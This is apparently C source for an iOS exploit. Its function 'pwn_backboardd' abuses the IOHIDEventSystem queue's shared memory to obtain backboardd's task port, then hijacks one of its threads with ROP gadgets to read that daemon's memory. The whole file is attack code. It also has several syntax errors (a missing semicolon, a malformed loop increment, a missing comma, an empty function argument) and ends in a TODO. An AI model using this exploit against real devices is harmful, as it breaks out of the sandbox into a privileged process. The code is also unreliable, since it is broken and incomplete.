#include <dlfcn.h>              // dlsym
#include <sched.h>              // sched_yield
#include <stdint.h>
#include <mach/mach.h>
#include "common.h"
#include "hid.h"
#include "backboardd.h"

#define REGSIZE 8

typedef struct
{
    mach_msg_header_t hdr;
    mach_msg_max_trailer_t trailer;
} hid_msg_t;

static thread_t task_get_thread(task_t task)
{
    task_t self = mach_task_self();
    thread_t thread = MACH_PORT_NULL;

    thread_act_array_t threads = NULL;
    mach_msg_type_number_t tnum = 0;
    ASSERT_RET("task_threads", task_threads(task, &threads, &tnum));
    LOG("Got %u thread ports", tnum);
    thread = threads && tnum > 0 ? threads[0] : MACH_PORT_NULL;
    if(threads)
    {
        for(size_t i = 1; i < tnum; ++i)
        {
            mach_port_deallocate(self, threads[i]);
        }
        mach_vm_deallocate(self, (mach_vm_address_t)threads, tnum * sizeof(thread_t));
    }

out:;
    return thread;
}

static kern_return_t thread_go(thread_t thread, arm_thread_state64_t *state)
{
    kern_return_t ret = 0;

    ASSERT_RET("act_set_state", ret = act_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)state, ARM_THREAD_STATE64_COUNT));
    ASSERT_RET("thread_resume", ret = thread_resume(thread));

out:;
    return ret;
}

static kern_return_t thread_wait(thread_t thread, arm_thread_state64_t *state, mach_vm_address_t pc)
{
    kern_return_t ret = 0;

    do
    {
        sched_yield();
        mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
        ASSERT_RET("act_get_state", ret = act_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)state, &cnt));
    } while(state->__pc != pc)
    ASSERT_RET("thread_resume", ret = thread_resume(thread));

out:;
    return ret;
}

static kern_return_t thread_read(thread_t thread, arm_thread_state64_t *state, mach_vm_address_t addr, void *buf, size_t len, mach_vm_address_t read_gadget, mach_vm_address_t ret_gadget)
{
    kern_return_t ret = 0;

    uint64_t *out = buf;
    for(size_t i = 0; i < len; += REGSIZE)
    {
        state->__x[0] = addr + i;
        state->__pc = read_gadget;
        state->__lr = ret_gadget;
        ASSERT_RET("thread_go(read)",   ret = thread_go(thread, state));
        ASSERT_RET("thread_wait(read)", ret = thread_wait(thread, state, ret_gadget));
        *(out++) = state->__x[0];
    }

out:;
    return ret;
}

mach_port_t pwn_backboardd(void)
{
#define QUEUE_SIZE 0x8000
    kern_return_t ret = 0;
    task_t self     = mach_task_self(),
           bb_task  = MACH_PORT_NULL,
           loc_task = MACH_PORT_NULL;
    thread_t bb_thread  = MACH_PORT_NULL;
    mach_port_t local   = MACH_PORT_NULL,
                notify  = MACH_PORT_NULL,
                server  = MACH_PORT_NULL,
                client  = MACH_PORT_NULL;
    mem_entry_name_port_t object = MACH_PORT_NULL;
    arm_thread_state64_t saved_state = {};
    mach_vm_address_t addr = 0;
    mach_vm_address_t sym_malloc          = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "malloc"),
                      sym_mach_port_names = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "mach_port_names")
                      sym_loader          = (mach_vm_address_t)dlsym(RTLD_DEFAULT, "os_buflet_get_object_address"),
                      sym_ret             = sym_loader + 4;

    if(*(uint32_t*)sym_ret != 0xd65f03c0)
    {
        LOG("Expected ret not found");
        goto out;
    }

    local = mach_reply_port();
    ASSERT_PORT("mach_reply_port", local);
    ASSERT_RET("mach_port_insert_right", mach_port_insert_right(self, local,  local,  MACH_MSG_TYPE_MAKE_SEND));

    notify = mach_reply_port();
    ASSERT_PORT("mach_reply_port", notify);

    ret = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &server);
    ASSERT_RET_PORT("bootstrap_look_up", ret, server);

    ret = io_hideventsystem_open(server, self, 3, NULL, 0, 0, 0, local, &client);
    ASSERT_RET_PORT("io_hideventsystem_open", ret, client);

    ASSERT_RET("io_hideventsystem_clear_service_cache", io_hideventsystem_clear_service_cache(client));

    mach_vm_address_t matches  = 0,
                      services = 0;
    uint32_t mlen = 0,
             slen = 0;
    ret = io_hideventsystem_copy_matching_services(client, NULL, 0, &matches, &mlen, &services, &slen);
    if(matches)
    {
        mach_vm_deallocate(self, matches, mlen);
    }
    if(services)
    {
        mach_vm_deallocate(self, services, slen);
    }
    ASSERT_RET("io_hideventsystem_copy_matching_services", ret);

    ret = io_hideventsystem_queue_create(client, notify, QUEUE_SIZE, &object);
    ASSERT_RET_PORT("io_hideventsystem_queue_create", ret, object);

    ASSERT_RET("mach_vm_map", mach_vm_map(self, &addr, QUEUE_SIZE + 0x1000, 0x0, VM_FLAGS_ANYWHERE, object, 0, 0, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE));
    LOG("Queue: " ADDR, addr);

    volatile mach_msg_header_t* shmsg = (volatile mach_msg_header_t*)(addr + QUEUE_SIZE + 0x10);
    shmsg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
    shmsg->msgh_local_port = 0x103; // mach_task_self

    ASSERT_RET("io_hideventsystem_queue_start", io_hideventsystem_queue_start(client));

    hid_msg_t msg;
    ASSERT_RET("mach_msg_receive", mach_msg(&msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(msg), notify, 1000, MACH_PORT_NULL));

    bb_task = msg.hdr.msgh_remote_port;
    ASSERT_PORT("bb_task", bb_task);

    bb_thread = task_get_thread(bb_task);
    ASSERT_PORT("bb_thread", bb_thread);
    ASSERT_RET("thread_suspend(saved)", thread_suspend(bb_thread));

    mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
    ASSERT_RET("act_get_state(saved)", act_get_state(bb_thread, ARM_THREAD_STATE64, (thread_state_t)&saved_state, &cnt));
    arm_thread_state64_t state = saved_state;

    state.x[0] = REGSIZE * 4;

    ASSERT_RET("thread_go(saved)", thread_go(bb_thread, ));
    mach_port_deallocate(self, bb_thread);
    bb_thread = MACH_PORT_NULL;


out:;
    return loc_task; // TODO
}
